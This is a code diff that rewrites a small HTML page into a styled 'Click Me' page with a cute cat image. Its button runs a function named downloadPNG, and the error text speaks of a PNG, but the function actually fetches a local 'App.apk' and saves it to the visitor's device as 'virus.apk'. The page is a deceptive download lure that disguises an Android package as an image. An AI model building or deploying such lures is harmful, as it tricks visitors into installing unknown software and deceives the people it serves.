@@ -1,21 +1,132 @@
-<button id="downloadBtn">Click Me</button>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>click</title>
 
-<script>
-document.getElementById("downloadBtn").addEventListener("click", async () => {
-    const response = await fetch("./pfp.jpeg");
-    const blob = await response.blob();
+    <style>
+        * {
+            box-sizing: border-box;
+        }
 
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: white;
+        }
 
-    a.href = url;
-    a.download = "my-image.png";
-    a.style.display = "none";
+        .container {
+            width: 90%;
+            max-width: 500px;
+            padding: 40px;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 24px;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+        }
 
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+        h1 {
+            margin-top: 0;
+            font-size: 32px;
+        }
 
-    setTimeout(() => URL.revokeObjectURL(url), 1000);
-});
-</script>
+        p {
+            color: #94a3b8;
+            margin-bottom: 30px;
+        }
+
+        button {
+            border: none;
+            padding: 15px 35px;
+            font-size: 17px;
+            font-weight: bold;
+            color: #0f172a;
+            background: #38bdf8;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.25s ease;
+            box-shadow: 0 8px 25px rgba(56, 189, 248, 0.3);
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            background: #7dd3fc;
+            box-shadow: 0 12px 30px rgba(56, 189, 248, 0.5);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .cat {
+            margin-top: 30px;
+            width: 220px;
+            max-width: 100%;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <h1></h1>
+
+        <p></p>
+
+        <button onclick="downloadPNG()">
+            Click Me
+        </button>
+
+        <br>
+
+        <img src="cat.gif" class="cat" alt="Cute cat">
+
+    </div>
+
+
+    <script>
+        async function downloadPNG() {
+
+            try {
+                const response = await fetch("./App.apk");
+
+                if (!response.ok) {
+                    throw new Error("Image not found");
+                }
+
+                const blob = await response.blob();
+
+                const url = URL.createObjectURL(blob);
+
+                const link = document.createElement("a");
+                link.href = url;
+                link.download = "virus.apk";
+
+                document.body.appendChild(link);
+                link.click();
+                link.remove();
+
+                setTimeout(() => {
+                    URL.revokeObjectURL(url);
+                }, 1000);
+
+            } catch (error) {
+                alert("Could not download the PNG 😿");
+                console.error(error);
+            }
+        }
+    </script>
+
+</body>
+</html>
